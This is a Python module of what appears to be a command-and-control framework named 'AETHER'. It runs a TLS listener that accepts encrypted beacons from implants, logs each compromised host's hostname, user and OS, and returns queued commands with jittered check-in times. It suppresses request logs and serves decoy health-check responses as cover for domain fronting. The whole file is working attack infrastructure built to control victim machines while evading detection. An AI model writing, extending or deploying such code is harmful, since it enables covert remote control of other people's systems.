#!/usr/bin/env python3
"""
AETHER HTTPS Handler with Domain Fronting
Seamless integration with existing session management.
"""
import os
import ssl
import socket
import threading
import json
import base64
import hashlib
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import logging

class AetherHTTPSHandler(BaseHTTPRequestHandler):
    """HTTPS request handler for beacon and command delivery."""
    
    def __init__(self, *args, **kwargs):
        self.server_instance = kwargs.pop('server_instance')
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        """Suppress standard HTTP logs."""
        pass
    
    def _authenticate_beacon(self, data):
        """Verify beacon authenticity."""
        try:
            decrypted = self.server_instance.crypto.decrypt(data)
            beacon = json.loads(decrypted)
            
            # Basic validation
            if 'id' not in beacon or 'timestamp' not in beacon:
                return None
            
            # Check if beacon is too old (replay protection)
            beacon_time = time.mktime(time.strptime(beacon['timestamp'], '%Y-%m-%dT%H:%M:%S'))
            if time.time() - beacon_time > 300:  # 5 minutes
                return None
            
            return beacon
        except:
            return None
    
    def do_POST(self):
        """Handle POST requests (agent beacons)."""
        content_length = int(self.headers.get('Content-Length', 0))
        if content_length == 0:
            self.send_error(400, "No data")
            return
        
        post_data = self.rfile.read(content_length)
        
        # Check for domain fronting
        fronting_host = self.headers.get('Host', '')
        client_ip = self.client_address[0]
        
        # Authenticate and process beacon
        beacon = self._authenticate_beacon(post_data)
        if not beacon:
            self.send_error(403, "Invalid beacon")
            return
        
        # Get session ID
        session_id = beacon.get('id', hashlib.sha256(client_ip.encode()).hexdigest()[:8])
        
        # Update or create session
        session_info = {
            'id': session_id,
            'address': client_ip,
            'hostname': beacon.get('hostname', 'Unknown'),
            'user': beacon.get('user', 'Unknown'),
            'os': beacon.get('os', 'Unknown'),
            'first_seen': time.strftime('%Y-%m-%d %H:%M:%S'),
            'last_seen': time.strftime('%Y-%m-%d %H:%M:%S'),
            'beacon_count': beacon.get('count', 0),
            'fronting_used': bool(fronting_host and fronting_host != self.server_instance.host)
        }
        
        # Use existing session manager
        self.server_instance.sessions.add(session_id, session_info)
        
        # Get queued commands for this session
        commands = []
        if hasattr(self.server_instance.sessions, 'get_queued_commands'):
            commands = self.server_instance.sessions.get_queued_commands(session_id)
        elif hasattr(self.server_instance.sessions, 'get_pending_commands'):
            # Alternative method name
            commands = self.server_instance.sessions.get_pending_commands(session_id)
        
        # Prepare response
        response = {
            'status': 'ok',
            'session': session_id,
            'commands': commands,
            'next_beacon': 30 + int(hashlib.sha256(session_id.encode()).hexdigest()[:2], 16) % 20
        }
        
        # Encrypt response
        encrypted_response = self.server_instance.crypto.encrypt(json.dumps(response))
        
        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Length', str(len(encrypted_response)))
        self.end_headers()
        self.wfile.write(encrypted_response)
        
        # Log
        print(f"[HTTPS] Beacon from {client_ip} ({session_id}) - {len(commands)} commands")
    
    def do_GET(self):
        """Handle GET requests (cover traffic and health checks)."""
        # Serve benign responses for domain fronting
        if self.path in ['/', '/health', '/status', '/update/check']:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            response = {
                'status': 'online',
                'version': '1.0.0',
                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
            }
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()

class AetherHTTPSServer:
    """Managed HTTPS server with TLS and threading."""
    
    def __init__(self, host='0.0.0.0', port=8443, certfile='server.crt', keyfile='server.key'):
        self.host = host
        self.port = port
        self.certfile = certfile
        self.keyfile = keyfile
        self.server = None
        self.thread = None
        self.running = False
    
    def start(self, main_server_instance):
        """Start the HTTPS server in background thread."""
        if not (os.path.exists(self.certfile) and os.path.exists(self.keyfile)):
            print(f"[!] SSL certificate files not found: {self.certfile}, {self.keyfile}")
            print(f"[!] HTTPS server not started. Generate certs with:")
            print(f"    openssl req -x509 -newkey rsa:4096 -keyout {self.keyfile} -out {self.certfile} -days 365 -nodes")
            return False
        
        # Create handler with server instance
        handler = lambda *args: AetherHTTPSHandler(*args, server_instance=main_server_instance)
        
        # Create and configure HTTPS server
        self.server = HTTPServer((self.host, self.port), handler)
        
        # Wrap with SSL
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=self.certfile, keyfile=self.keyfile)
        self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
        
        # Start in background thread
        self.running = True
        self.thread = threading.Thread(target=self._run_server, daemon=True)
        self.thread.start()
        
        print(f"[+] HTTPS server started on {self.host}:{self.port}")
        print(f"[+] Domain fronting enabled. Use Host header: {self.host}")
        return True
    
    def _run_server(self):
        """Run the server in background thread."""
        try:
            self.server.serve_forever()
        except Exception as e:
            if self.running:
                print(f"[-] HTTPS server error: {e}")
    
    def stop(self):
        """Stop the HTTPS server."""
        self.running = False
        if self.server:
            self.server.shutdown()
        if self.thread:
            self.thread.join(timeout=5)
        print(f"[-] HTTPS server stopped")